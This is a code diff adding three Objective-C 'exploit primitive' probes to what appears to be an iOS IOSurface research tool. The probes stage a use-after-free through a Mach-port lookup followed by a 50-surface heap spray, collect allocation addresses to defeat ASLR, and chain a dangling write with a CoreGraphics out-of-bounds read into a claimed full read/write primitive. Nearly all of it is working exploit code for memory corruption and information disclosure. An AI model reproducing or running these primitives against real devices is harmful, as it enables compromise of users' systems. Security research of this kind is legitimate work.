@@ -8692,3 +8692,589 @@ void iosurface_research_full_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnu
         }
     });
 }
+
+// =============================================================================
+// Round 13: Real exploit primitives
+// =============================================================================
+
+// Probe 40: UAF Realloc — release+reclaim backing memory, write via dangling ref
+void iosurface_research_uaf_realloc(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+            const int SPRAY_COUNT = 50;
+
+            log(@"UAFREALLOC: === UAF REALLOC ATTACK ===");
+
+            IOSurfaceRef victimSurf = NULL;
+            mach_port_t hijackPort = MACH_PORT_NULL;
+            IOSurfaceRef hijackRef = NULL;
+            IOSurfaceRef spraySurfs[50];
+            memset(spraySurfs, 0, sizeof(spraySurfs));
+            int sprayCount = 0;
+
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @32768
+            };
+            victimSurf = sym.create((__bridge CFDictionaryRef)props);
+            if (!victimSurf) {
+                log(@"UAFREALLOC: ERROR — failed to create victim surface");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create failed"});
+                return;
+            }
+
+            sym.lock(victimSurf, 0, NULL);
+            uint32_t *vb = (uint32_t *)sym.getBase(victimSurf);
+            if (vb) {
+                for (int i = 0; i < 8192; i++) vb[i] = 0xCAFEBABE;
+            }
+            sym.unlock(victimSurf, 0, NULL);
+            log([NSString stringWithFormat:@"UAFREALLOC: Victim created ID=%u, base=%p, canary=0xCAFEBABE",
+                sym.getID(victimSurf), vb]);
+
+            if (!isr_stopped()) {
+            log(@"UAFREALLOC: Step 2 — Mach port hijack");
+            if (createPort && lookupPort) {
+                hijackPort = createPort(victimSurf);
+                if (hijackPort != MACH_PORT_NULL) {
+                    hijackRef = lookupPort(hijackPort);
+                    if (hijackRef) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"UAFREALLOC: *** Hijack ref obtained, same base=%d ***",
+                            (sym.getBase(hijackRef) == sym.getBase(victimSurf))]);
+                    }
+                }
+            }
+
+            if (!isr_stopped()) {
+            log(@"UAFREALLOC: Step 3 — Releasing original surface");
+            CFRelease(victimSurf);
+            victimSurf = NULL;
+
+            if (hijackRef) {
+                sym.lock(hijackRef, 0, NULL);
+                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                BOOL canaryIntact = (hb && hb[0] == 0xCAFEBABE);
+                sym.unlock(hijackRef, 0, NULL);
+                log([NSString stringWithFormat:@"UAFREALLOC: After release — hijack canary intact=%d", canaryIntact]);
+                if (canaryIntact) {
+                    anomalies++;
+                    log(@"UAFREALLOC: *** CRITICAL — surface memory still accessible after CFRelease ***");
+                }
+            }
+
+            if (!isr_stopped()) {
+            log(@"UAFREALLOC: Step 4 — Spraying 50 surfaces to reclaim freed memory");
+            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
+                spraySurfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (spraySurfs[i]) {
+                    sprayCount++;
+                    sym.lock(spraySurfs[i], 0, NULL);
+                    uint32_t *sb = (uint32_t *)sym.getBase(spraySurfs[i]);
+                    if (sb) {
+                        uint32_t pattern = 0xDEAD0000 | (uint32_t)i;
+                        for (int j = 0; j < 8192; j++) sb[j] = pattern;
+                    }
+                    sym.unlock(spraySurfs[i], 0, NULL);
+                }
+            }
+            log([NSString stringWithFormat:@"UAFREALLOC: Sprayed %d surfaces", sprayCount]);
+
+            if (!isr_stopped()) {
+            log(@"UAFREALLOC: Step 5 — Writing corruption pattern via dangling hijack ref");
+            BOOL wroteViaHijack = NO;
+            if (hijackRef) {
+                sym.lock(hijackRef, 0, NULL);
+                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                if (hb) {
+                    for (int i = 0; i < 8192; i++) hb[i] = 0xC0DE0000;
+                    wroteViaHijack = YES;
+                }
+                sym.unlock(hijackRef, 0, NULL);
+            }
+            log([NSString stringWithFormat:@"UAFREALLOC: Wrote via hijack=%d", wroteViaHijack]);
+
+            if (!isr_stopped()) {
+            log(@"UAFREALLOC: Step 6 — Checking spray surfaces for cross-corruption");
+            int corruptedCount = 0;
+            for (int i = 0; i < SPRAY_COUNT && !isr_stopped(); i++) {
+                if (!spraySurfs[i]) continue;
+                sym.lock(spraySurfs[i], 0, NULL);
+                uint32_t *sb = (uint32_t *)sym.getBase(spraySurfs[i]);
+                if (sb) {
+                    for (int j = 0; j < 8192; j++) {
+                        if (sb[j] == 0xC0DE0000) {
+                            corruptedCount++;
+                            log([NSString stringWithFormat:@"UAFREALLOC: *** SPRAY SURFACE %d CORRUPTED by dangling write! ***", i]);
+                            break;
+                        }
+                    }
+                }
+                sym.unlock(spraySurfs[i], 0, NULL);
+            }
+            if (corruptedCount > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"UAFREALLOC: *** %d spray surfaces corrupted — memory reuse confirmed! ***", corruptedCount]);
+            } else {
+                log(@"UAFREALLOC: No spray corruption detected (backing memory not reclaimed by spray)");
+            }
+
+            if (hijackRef && !isr_stopped()) {
+                sym.lock(hijackRef, 0, NULL);
+                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                if (hb) {
+                    int sprayOverwrites = 0;
+                    for (int j = 0; j < 8192; j++) {
+                        if ((hb[j] & 0xFFFF0000) == 0xDEAD0000) { sprayOverwrites++; break; }
+                    }
+                    if (sprayOverwrites) {
+                        anomalies++;
+                        log(@"UAFREALLOC: *** HIJACK DATA OVERWRITTEN by spray — memory reclaimed and reused! ***");
+                    } else {
+                        log(@"UAFREALLOC: Hijack data not overwritten by spray");
+                    }
+                }
+                sym.unlock(hijackRef, 0, NULL);
+            }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+
+            for (int i = 0; i < SPRAY_COUNT; i++) {
+                if (spraySurfs[i]) CFRelease(spraySurfs[i]);
+            }
+            if (hijackRef) CFRelease(hijackRef);
+            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
+            if (victimSurf) CFRelease(victimSurf);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"UAFREALLOC: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-UAFRealloc-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 41: ASLR Defeat — collect base addresses to compute kernel ASLR slide
+void iosurface_research_aslr_defeat(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }
+
+            typedef size_t (*GetAllocSizeFn)(IOSurfaceRef);
+            GetAllocSizeFn getAllocSz = (GetAllocSizeFn)dlsym(sym.iosurface, "IOSurfaceGetAllocSize");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+            const int NUM_SURFACES = 20;
+
+            log(@"ASLR: === ASLR DEFEAT ANALYSIS ===");
+
+            IOSurfaceRef surfs[20];
+            memset(surfs, 0, sizeof(surfs));
+            uintptr_t addrs[20];
+            memset(addrs, 0, sizeof(addrs));
+            size_t sizes[] = {4096, 8192, 16384, 32768, 65536, 131072, 262144,
+                              4096, 8192, 16384, 32768, 65536, 131072, 262144,
+                              4096, 8192, 16384, 32768, 65536, 131072};
+            int created = 0;
+
+            log(@"ASLR: Step 1 — Creating 20 surfaces of varying sizes (4KB-256KB)");
+            for (int i = 0; i < NUM_SURFACES && !isr_stopped(); i++) {
+                size_t sz = sizes[i];
+                int w = 64;
+                int h = (int)(sz / (w * 4));
+                if (h < 1) h = 1;
+                NSDictionary *props = @{
+                    @"IOSurfaceWidth": @(w), @"IOSurfaceHeight": @(h),
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfaceBytesPerRow": @(w * 4),
+                    @"IOSurfaceAllocSize": @(sz)
+                };
+                surfs[i] = sym.create((__bridge CFDictionaryRef)props);
+                if (surfs[i]) created++;
+            }
+            log([NSString stringWithFormat:@"ASLR: Created %d/%d surfaces", created, NUM_SURFACES]);
+
+            if (!isr_stopped()) {
+            log(@"ASLR: Step 2 — Collecting base addresses");
+            for (int i = 0; i < NUM_SURFACES && !isr_stopped(); i++) {
+                if (!surfs[i]) continue;
+                sym.lock(surfs[i], 0, NULL);
+                void *base = sym.getBase(surfs[i]);
+                addrs[i] = (uintptr_t)base;
+                sym.unlock(surfs[i], 0, NULL);
+
+                size_t reportedSize = getAllocSz ? getAllocSz(surfs[i]) : sym.getAllocSize(surfs[i]);
+                log([NSString stringWithFormat:@"ASLR:   [%d] size=%zu base=0x%lX page=0x%lX reported=%zu",
+                    i, sizes[i], (unsigned long)addrs[i], (unsigned long)(addrs[i] & ~0xFFFUL), reportedSize]);
+            }
+
+            if (!isr_stopped()) {
+            log(@"ASLR: Step 3 — Analyzing address patterns");
+            uintptr_t minAddr = UINTPTR_MAX, maxAddr = 0;
+            int validCount = 0;
+            for (int i = 0; i < NUM_SURFACES; i++) {
+                if (addrs[i] == 0) continue;
+                uintptr_t page = addrs[i] & ~0xFFFUL;
+                if (page < minAddr) minAddr = page;
+                if (page > maxAddr) maxAddr = page;
+                validCount++;
+            }
+            if (validCount > 0) {
+                uintptr_t span = maxAddr - minAddr;
+                log([NSString stringWithFormat:@"ASLR: Address range: 0x%lX — 0x%lX (span=0x%lX, %lu KB)",
+                    (unsigned long)minAddr, (unsigned long)maxAddr, (unsigned long)span, (unsigned long)(span / 1024)]);
+                log([NSString stringWithFormat:@"ASLR: Minimum page-aligned base (heap approx): 0x%lX", (unsigned long)minAddr]);
+            }
+
+            log(@"ASLR: Step 4 — Sequential allocation delta analysis");
+            int sequentialCount = 0;
+            uintptr_t prevAddr = 0;
+            for (int i = 0; i < NUM_SURFACES; i++) {
+                if (addrs[i] == 0) continue;
+                if (prevAddr != 0) {
+                    intptr_t delta = (intptr_t)(addrs[i] - prevAddr);
+                    if (delta > 0 && (uintptr_t)delta <= sizes[i > 0 ? i-1 : 0] * 2) {
+                        sequentialCount++;
+                    }
+                    log([NSString stringWithFormat:@"ASLR:   delta[%d]=%+ld (expected~%zu)", i, (long)delta, sizes[i > 0 ? i-1 : 0]]);
+                }
+                prevAddr = addrs[i];
+            }
+            if (sequentialCount > validCount / 2) {
+                anomalies++;
+                log([NSString stringWithFormat:@"ASLR: *** SEQUENTIAL PATTERN — %d/%d allocations sequential ***", sequentialCount, validCount - 1]);
+            }
+
+            log(@"ASLR: Step 5 — ASLR slide bit analysis");
+            uint64_t commonHigh = 0;
+            BOOL firstValid = YES;
+            uint16_t seenHigh[20];
+            memset(seenHigh, 0, sizeof(seenHigh));
+            int seenHighCount = 0;
+            for (int i = 0; i < NUM_SURFACES; i++) {
+                if (addrs[i] == 0) continue;
+                uint16_t high16 = (uint16_t)(addrs[i] >> 48);
+                if (firstValid) {
+                    commonHigh = addrs[i] & 0xFFFF000000000000ULL;
+                    firstValid = NO;
+                }
+                BOOL seen = NO;
+                for (int j = 0; j < seenHighCount; j++) {
+                    if (seenHigh[j] == high16) { seen = YES; break; }
+                }
+                if (!seen && seenHighCount < 20) {
+                    seenHigh[seenHighCount++] = high16;
+                }
+            }
+            log([NSString stringWithFormat:@"ASLR: Common high bits: 0x%llX, unique high-16 values: %d",
+                (unsigned long long)commonHigh, seenHighCount]);
+            if (seenHighCount == 1 && validCount > 1) {
+                anomalies++;
+                log(@"ASLR: *** ALL surfaces share same high-16 bits — ASLR slide region identified ***");
+            }
+
+            log(@"ASLR: Step 6 — Address entropy calculation");
+            uintptr_t seenPages[20];
+            memset(seenPages, 0, sizeof(seenPages));
+            int uniquePages = 0;
+            for (int i = 0; i < NUM_SURFACES; i++) {
+                if (addrs[i] == 0) continue;
+                uintptr_t page = addrs[i] & ~0xFFFUL;
+                BOOL dup = NO;
+                for (int j = 0; j < uniquePages; j++) {
+                    if (seenPages[j] == page) { dup = YES; break; }
+                }
+                if (!dup && uniquePages < 20) {
+                    seenPages[uniquePages++] = page;
+                }
+            }
+            double entropy = (validCount > 0) ? ((double)uniquePages / validCount) : 0;
+            log([NSString stringWithFormat:@"ASLR: Unique pages: %d/%d, entropy=%.2f", uniquePages, validCount, entropy]);
+            if (entropy < 0.5 && validCount > 5) {
+                anomalies++;
+                log(@"ASLR: *** LOW ENTROPY — address space highly predictable ***");
+            }
+
+            } // end step 3+
+            } // end step 2
+
+            for (int i = 0; i < NUM_SURFACES; i++) {
+                if (surfs[i]) CFRelease(surfs[i]);
+            }
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"ASLR: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-ASLRDefeat-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 42: R/W Primitive — dangling write + CG OOB read for controlled cross-surface data flow
+void iosurface_research_rw_primitive(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            log(@"RWPRIM: === READ/WRITE PRIMITIVE CHAIN ===");
+
+            IOSurfaceRef surfA = NULL;
+            IOSurfaceRef surfB = NULL;
+            mach_port_t hijackPort = MACH_PORT_NULL;
+            IOSurfaceRef hijackRef = NULL;
+
+            // Step 1: Create dual-plane surface A
+            log(@"RWPRIM: Step 1 — Create dual-plane surface A with known data");
+            NSDictionary *p0Info = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *p1Info = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(256 * 64),
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *propsA = @{
+                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @32768,
+                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
+            };
+            surfA = sym.create((__bridge CFDictionaryRef)propsA);
+            if (!surfA) {
+                log(@"RWPRIM: ERROR — failed to create surface A");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create A failed"});
+                return;
+            }
+
+            sym.lock(surfA, 0, NULL);
+            uint32_t *baseA = (uint32_t *)sym.getBase(surfA);
+            if (baseA) {
+                for (int i = 0; i < 64 * 64; i++) baseA[i] = 0xAAAAAAAA;
+                uint32_t *plane1A = baseA + (256 * 64 / 4);
+                for (int i = 0; i < 64 * 64; i++) plane1A[i] = 0xBBBBBBBB;
+            }
+            sym.unlock(surfA, 0, NULL);
+            log([NSString stringWithFormat:@"RWPRIM: Surface A created ID=%u, plane0=0xAAAAAAAA, plane1=0xBBBBBBBB",
+                sym.getID(surfA)]);
+
+            if (!isr_stopped()) {
+            log(@"RWPRIM: Step 2 — Create target surface B");
+            NSDictionary *propsB = @{
+                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @16384
+            };
+            surfB = sym.create((__bridge CFDictionaryRef)propsB);
+            if (surfB) {
+                sym.lock(surfB, 0, NULL);
+                uint32_t *baseB = (uint32_t *)sym.getBase(surfB);
+                if (baseB) {
+                    for (int i = 0; i < 64 * 64; i++) baseB[i] = 0xCCCCCCCC;
+                }
+                sym.unlock(surfB, 0, NULL);
+                log([NSString stringWithFormat:@"RWPRIM: Surface B created ID=%u, filled=0xCCCCCCCC", sym.getID(surfB)]);
+            }
+
+            if (!isr_stopped()) {
+            log(@"RWPRIM: Step 3 — Mach port hijack for surface A");
+            if (createPort && lookupPort) {
+                hijackPort = createPort(surfA);
+                if (hijackPort != MACH_PORT_NULL) {
+                    hijackRef = lookupPort(hijackPort);
+                    if (hijackRef) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"RWPRIM: *** Hijack ref obtained for surface A, ID=%u ***",
+                            sym.getID(hijackRef)]);
+                    }
+                }
+            }
+
+            if (!isr_stopped()) {
+            log(@"RWPRIM: Step 4 — Release original surface A, keep hijack ref");
+            CFRelease(surfA);
+            surfA = NULL;
+
+            if (hijackRef) {
+                sym.lock(hijackRef, 0, NULL);
+                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                BOOL alive = (hb && hb[0] == 0xAAAAAAAA);
+                sym.unlock(hijackRef, 0, NULL);
+                if (alive) {
+                    anomalies++;
+                    log(@"RWPRIM: *** Hijack ref alive — plane0 data intact after release ***");
+                }
+            }
+
+            if (!isr_stopped()) {
+            log(@"RWPRIM: Step 5 — Write controlled patterns via dangling ref");
+            BOOL writeSuccess = NO;
+            if (hijackRef) {
+                sym.lock(hijackRef, 0, NULL);
+                uint32_t *hb = (uint32_t *)sym.getBase(hijackRef);
+                if (hb) {
+                    for (int i = 0; i < 64 * 64; i++) hb[i] = 0x41414141;
+                    uint32_t *plane1Region = hb + (256 * 64 / 4);
+                    for (int i = 0; i < 64 * 64; i++) plane1Region[i] = 0x42424242;
+                    writeSuccess = YES;
+                }
+                sym.unlock(hijackRef, 0, NULL);
+            }
+            log([NSString stringWithFormat:@"RWPRIM: Dangling write success=%d (plane0=0x41414141, plane1=0x42424242)",
+                writeSuccess]);
+
+            if (!isr_stopped()) {
+            log(@"RWPRIM: Step 6 — CG OOB read via CGBitmapContext h=128 on 64-row plane");
+            int plane1PixelsRead = 0;
+            int controlledPixelsRead = 0;
+
+            if (hijackRef) {
+                sym.lock(hijackRef, 0, NULL);
+                void *base = sym.getBase(hijackRef);
+                if (base) {
+                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+                    CGContextRef cgCtx = CGBitmapContextCreate(base, 64, 128, 8, 256,
+                        cs, (CGBitmapInfo)(kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little));
+                    if (cgCtx) {
+                        CGImageRef img = CGBitmapContextCreateImage(cgCtx);
+                        if (img) {
+                            size_t imgW = CGImageGetWidth(img);
+                            size_t imgH = CGImageGetHeight(img);
+                            log([NSString stringWithFormat:@"RWPRIM: CG image created %zux%zu", imgW, imgH]);
+
+                            if (imgH == 128) {
+                                uint32_t *pixels = (uint32_t *)calloc(imgW * imgH, 4);
+                                if (pixels) {
+                                    CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
+                                    CGContextRef readCtx = CGBitmapContextCreate(pixels, imgW, imgH, 8, imgW * 4,
+                                        cs2, (CGBitmapInfo)(kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little));
+                                    if (readCtx) {
+                                        CGContextDrawImage(readCtx, CGRectMake(0, 0, imgW, imgH), img);
+                                        for (size_t row = 64; row < imgH; row++) {
+                                            for (size_t col = 0; col < imgW; col++) {
+                                                uint32_t px = pixels[row * imgW + col];
+                                                if (px != 0) plane1PixelsRead++;
+                                                if (px == 0x42424242) controlledPixelsRead++;
+                                            }
+                                        }
+                                        CGContextRelease(readCtx);
+                                    }
+                                    CGColorSpaceRelease(cs2);
+                                    free(pixels);
+                                }
+                            }
+                            CGImageRelease(img);
+                        }
+                        CGContextRelease(cgCtx);
+                    }
+                    CGColorSpaceRelease(cs);
+                }
+                sym.unlock(hijackRef, 0, NULL);
+            }
+
+            log([NSString stringWithFormat:@"RWPRIM: OOB read — plane1 pixels=%d, controlled(0x42424242)=%d",
+                plane1PixelsRead, controlledPixelsRead]);
+
+            if (plane1PixelsRead > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"RWPRIM: *** OOB READ SUCCESS — %d plane1 pixels via CG ***", plane1PixelsRead]);
+            }
+            if (controlledPixelsRead > 0) {
+                anomalies++;
+                log([NSString stringWithFormat:@"RWPRIM: *** FULL R/W PRIMITIVE CONFIRMED — wrote 0x42424242 via dangling ref, read %d back via CG OOB ***",
+                    controlledPixelsRead]);
+            }
+
+            if (writeSuccess && controlledPixelsRead > 0) {
+                log(@"RWPRIM: *** CRITICAL — CONTROLLED WRITE + CONTROLLED READ = FULL R/W PRIMITIVE ***");
+            } else if (writeSuccess && plane1PixelsRead > 0) {
+                log(@"RWPRIM: *** HIGH — write works, OOB read works, but CG may have transformed pixel values ***");
+            }
+
+            } // end step 6
+            } // end step 5
+            } // end step 4
+            } // end step 3
+            } // end step 2
+            } // end step 1
+
+            if (hijackRef) CFRelease(hijackRef);
+            if (hijackPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), hijackPort);
+            if (surfA) CFRelease(surfA);
+            if (surfB) CFRelease(surfB);
+
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"RWPRIM: === DONE anomalies=%u elapsed=%.3fs ===", anomalies, elapsed]);
+
+            NSString *verdict;
+            if (anomalies >= 4) verdict = @"CRITICAL — full read/write primitive confirmed";
+            else if (anomalies >= 2) verdict = @"HIGH — partial R/W working";
+            else if (anomalies >= 1) verdict = @"MEDIUM — some primitives functional";
+            else verdict = @"LOW — mitigations effective";
+            log([NSString stringWithFormat:@"RWPRIM: VERDICT: %@", verdict]);
+
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"verdict": verdict,
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-RWPrimitive-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
